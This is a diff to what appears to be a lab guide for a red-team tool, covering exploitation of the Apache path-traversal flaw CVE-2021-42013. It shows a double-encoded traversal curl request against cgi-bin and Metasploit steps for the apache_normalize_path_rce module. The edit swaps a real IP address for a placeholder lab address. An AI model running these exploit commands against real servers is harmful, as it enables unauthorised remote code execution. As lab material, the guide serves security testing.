@@ -245,15 +245,16 @@ curl -X POST "http://target:8080/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin
 #### Metasploit Exploitation
 
 ```bash
-# Enter Kali container with Metasploit
-docker exec -it redamon-kali msfconsole
+# Enter your own Kali sandbox with Metasploit (or open the Kali terminal in the Red Zone);
+# list the sandboxes with: docker ps --filter label=redamon.sandbox=1
+docker exec -it redamon-kali-<key>-<instance> msfconsole
 
 # Search for the module
 msf6 > search CVE-2021-42013
 
-# Use the exploit (direct to EC2, bypass ALB)
+# Use the exploit (direct to EC2, bypass ALB); 192.0.2.10 stands for your lab host's address
 msf6 > use exploit/multi/http/apache_normalize_path_rce
-msf6 exploit(multi/http/apache_normalize_path_rce) > set RHOSTS 15.160.68.117
+msf6 exploit(multi/http/apache_normalize_path_rce) > set RHOSTS 192.0.2.10
 msf6 exploit(multi/http/apache_normalize_path_rce) > set RPORT 8080
 msf6 exploit(multi/http/apache_normalize_path_rce) > set SSL false
 msf6 exploit(multi/http/apache_normalize_path_rce) > show payloads
